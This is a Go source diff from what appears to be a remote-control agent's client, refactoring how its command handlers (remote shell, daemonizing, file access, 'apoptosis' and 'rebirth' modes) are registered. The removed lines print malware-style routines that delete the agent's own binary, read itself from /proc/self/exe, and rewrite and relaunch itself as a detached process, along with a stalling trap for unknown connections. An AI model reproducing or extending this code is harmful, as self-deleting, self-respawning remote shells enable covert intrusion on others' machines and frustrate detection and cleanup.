@@ -3,7 +3,7 @@ package base
 import (
 	"net"
 	"io"
-	"os"
+//	"os"
 	"os/exec"
 	"sync"
 //	"time"
@@ -15,13 +15,12 @@ import (
 	kit "../toolkit"
 	"../streamcoder"
 	"../smux"
-	"../godaemon"
 
-	"io/ioutil"
 	"fmt"
 )
 
-var ops map[string](func (string, net.Conn, *Client, *smux.Session)())
+var ops = make(map[string](func (string, net.Conn, *Client, *smux.Session)()))
+var inits = make([](func (*Client)()), 0)
 
 type Client struct {
 	UUID       []byte
@@ -41,7 +40,6 @@ type Client struct {
 }
 
 func NewClient() (*Client) {
-	initOps()
 	return &Client{
 		AgentTag: clientAgentTag,
 		HubKeyTag: initKeyTag,
@@ -52,7 +50,6 @@ func NewClient() (*Client) {
 }
 
 func NewClientM() (*Client) {
-	initOps()
 	return &Client{
 		AgentTag: clientAgentTag,
 		HubKeyTag: initKeyTag,
@@ -62,44 +59,30 @@ func NewClientM() (*Client) {
 	}
 }
 
-var initOps = func () {
-	if ops != nil {
-		return
+var RegOps = func (tag string, fn (func (string, net.Conn, *Client, *smux.Session)()) ) {
+	if ops == nil {
+		ops = make(map[string](func (string, net.Conn, *Client, *smux.Session)()))
 	}
 
-	ops = make(map[string](func (string, net.Conn, *Client, *smux.Session)()))
+	if fn == nil {
+		delete(ops, tag)
+	} else {
+		ops[tag] = fn
+	}
+}
 
-	ops[B_info] = pullInfo
-	ops[B_fast0] = fastC
-	ops[B_fast1] = fastC
-	ops[B_fast2] = fastC
+var RegInit = func (fn (func (*Client)()) ) {
+	if inits == nil {
+		inits = make([](func (*Client)()), 0)
+	}
 
-	ops[B_shk] = sh
-	ops[B_csh] = sh
-
-	ops[B_ppend] = ppX
-	ops[B_ppkill] = ppX
-
-	ops[B_reconn] = ccX
-	ops[B_kill] = ccX
-
-	ops[B_dodaemon] = ccX
-	ops[B_apoptosis] = ccX
-	ops[B_rebirth] = ccX
-	ops[B_evolution] = ccX
-
-	ops[B_fs] = ccFs
+	inits = append(inits, fn)
 }
 
 func (c *Client) Start(addr string) {
-	loadSelf(c)
 
-	if c.Daemon {
-		godaemon.MakeDaemon(&godaemon.DaemonAttr{})
-
-		if c.AutoClean {
-			cleanSelf()
-		}
+	for _, f := range inits {
+		f(c)
 	}
 
 	runtime.GOMAXPROCS(c.Proc)
@@ -228,7 +211,8 @@ func (c *Client) handle1(p1 net.Conn, mux *smux.Session) {
 	fn, ok := ops[mode]
 	if !ok {
 		kit.WriteVLen(p1, int64(9))
-		kit.TrollConn(p1)
+		//kit.TrollConn(p1)
+		return
 	}
 
 	kit.WriteVLen(p1, int64(0))
@@ -279,58 +263,4 @@ func (c *Client) handle2(p1 net.Conn, keep bool, bin string) {
 	}
 }
 
-var cleanSelf = func () {
-	name, err := kit.GetSelf()
-	if err != nil {
-		return
-	}
-	os.Remove(name)
-}
-
-var loadSelf = func (c *Client) {
-	fd, err := os.OpenFile("/proc/self/exe", os.O_RDONLY, 0400)
-	if err != nil {
-//fmt.Println("[err]os.OpenFile", err)
-		return
-	}
-	defer fd.Close()
-
-	b, err := ioutil.ReadAll(fd)
-	if err != nil {
-		c.selfbyte = nil
-		return
-	}
-
-	c.selfhex = kit.HashBytes256(b)
-	c.selfbyte = b
-}
-
-var dumpSelf = func (c *Client) {
-	ofd, ofp, err := kit.TryWX()
-	if err != nil {
-//fmt.Println("[err]TryWX()", err)
-		return
-	}
-
-	if c.selfbyte == nil {
-		return
-	}
-
-	ofd.Write(c.selfbyte)
-	ofd.Sync()
-	ofd.Close()
-
-	pl := exec.Command(ofp)
-	pl.SysProcAttr = &syscall.SysProcAttr{
-		Setpgid: true,
-//		Noctty: true,
-	}
-	err = pl.Start()
-	if err != nil {
-//fmt.Println("[err]pl.Start()", err)
-		return
-	}
-	pl.Process.Release()
-	os.Exit(0)
-}
 
